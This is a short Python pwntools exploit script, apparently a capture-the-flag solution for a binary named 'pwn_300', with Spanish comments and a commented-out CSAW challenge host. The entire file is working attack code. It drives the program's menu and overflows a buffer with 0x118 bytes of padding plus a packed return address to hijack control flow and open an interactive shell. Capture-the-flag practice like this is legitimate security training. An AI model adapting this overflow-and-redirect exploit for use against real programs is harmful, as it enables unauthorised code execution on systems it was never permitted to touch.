#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("pwn_300")
libc = elf.libc
context.log_level = "DEBUG"

# main 0x40137f
# despues de escribir mensaje 0x401460
# despues de escribir tama√±o de mensaje 0x4013ed
# despues de escribir numero de lineas 0401421

gs = '''
break *0x401270
'''

target=0x0401368+8

shell = p64(target)
OFFSET = 0x118
padd = b'A' * OFFSET

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        # p = remote('pwn.chal.csaw.io', 5004)
        return process(elf.path)

def config_mensaje_size(io,size_msg):
    io.sendline('1')
    io.sendline(size_msg)

def config_lineas_msg(io,n_lineas):
    io.sendline('2')
    io.sendline(n_lineas)

def escribir_mensaje(io,msg):
    io.sendline('3')
    io.sendline(msg)

def salir(io):
    io.sendline('4')

print(elf.plt)
io = start()
config_lineas_msg(io,str(0x11117fff))
payload = [
            padd,
            shell,
        ]
payload = b''.join(payload)
escribir_mensaje(io,payload)
salir(io)
io.interactive()